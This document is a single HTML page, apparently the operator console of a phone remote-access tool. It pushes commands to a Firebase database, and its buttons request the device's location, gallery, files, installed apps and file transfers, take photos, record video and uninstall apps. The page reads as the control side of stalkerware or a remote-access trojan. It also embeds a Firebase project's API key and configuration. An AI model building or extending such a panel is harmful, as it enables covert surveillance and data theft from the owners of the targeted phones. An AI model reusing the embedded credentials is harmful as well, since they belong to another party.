<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Remote Control Admin Panel</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    .btn-animate {
      transition: transform 0.2s ease, box-shadow 0.3s ease;
    }
    .btn-animate:hover {
      transform: translateY(-3px) scale(1.03);
      box-shadow: 0 10px 15px rgba(0, 0, 0, 0.15);
    }
  </style>
  <!-- Firebase JS SDK (v10+) -->
  <script type="module">
    // Firebase imports
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

    // Your Firebase config (from your screenshot)
    const firebaseConfig = {
      apiKey: "AIzaSy8mj3uIH06Ek3G1q58D1cm4RF5JfNTt0Y",
      authDomain: "xsiam-8cd91.firebaseapp.com",
      databaseURL: "https://xsiam-8cd91-default-rtdb.firebaseio.com",
      projectId: "xsiam-8cd91",
      storageBucket: "xsiam-8cd91.appspot.com",
      messagingSenderId: "144979568178",
      appId: "1:144979568178:web:0ac436e5207f5568aef7b",
      measurementId: "G-XP6J4uHQMK"
    };

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const database = getDatabase(app);

    // Make sendCommand globally accessible
    window.sendCommand = function(command) {
      const responseBox = document.getElementById("responseBox");
      // Push command to Firebase under 'admin_commands'
      push(ref(database, 'admin_commands'), {
        command: command,
        timestamp: Date.now()
      }).then(() => {
        responseBox.textContent = `✔️ Command "${command}" sent to Firebase!`;
      }).catch((e) => {
        responseBox.textContent = `❌ Failed to send command: ${e.message}`;
      });
    }
  </script>
</head>
<body class="bg-gray-100 font-sans py-10 px-4">

  <div class="max-w-6xl mx-auto bg-white shadow-2xl rounded-2xl p-8">
    <h1 class="text-4xl font-bold text-center mb-10 text-blue-700">📲 Remote Control Admin Panel</h1>

    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">

      <button onclick="sendCommand('get_location')" class="btn-animate bg-blue-500 hover:bg-blue-600 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
        📍 Get Location
      </button>

      <button onclick="sendCommand('get_gallery')" class="btn-animate bg-purple-500 hover:bg-purple-600 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
        🖼️ Access Gallery
      </button>

      <button onclick="sendCommand('get_apps')" class="btn-animate bg-pink-500 hover:bg-pink-600 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
        📱 Installed Apps
      </button>

      <button onclick="sendCommand('get_files')" class="btn-animate bg-green-500 hover:bg-green-600 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
        📁 File Manager
      </button>

      <button onclick="sendCommand('uninstall_app')" class="btn-animate bg-red-500 hover:bg-red-600 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
        ❌ Uninstall App
      </button>

      <button onclick="sendCommand('get_sysinfo')" class="btn-animate bg-indigo-500 hover:bg-indigo-600 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
        🧠 System Info
      </button>

      <button onclick="sendCommand('refresh_data')" class="btn-animate bg-yellow-400 hover:bg-yellow-500 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
        🔄 Refresh
      </button>

      <button onclick="sendCommand('file_transfer')" class="btn-animate bg-orange-500 hover:bg-orange-600 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
        📤 Upload / Download
      </button>

      <button onclick="sendCommand('send_notification')" class="btn-animate bg-teal-500 hover:bg-teal-600 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
        💬 Push Notification
      </button>

      <!-- NEW: Take Photo -->
      <button onclick="sendCommand('take_photo')" class="btn-animate bg-gray-800 hover:bg-gray-900 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
        📸 Take Photo
      </button>

      <!-- NEW: Record Video -->
      <button onclick="sendCommand('record_video')" class="btn-animate bg-amber-600 hover:bg-amber-700 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
        🎥 Record Video
      </button>

    </div>

    <!-- Response Section -->
    <div class="mt-10 bg-gray-100 p-4 rounded-xl border">
      <h2 class="font-bold text-lg mb-2 text-gray-700">📥 Command Response:</h2>
      <pre id="responseBox" class="text-sm text-gray-600 whitespace-pre-wrap">No response yet...</pre>
    </div>

  </div>
</body>
</html>
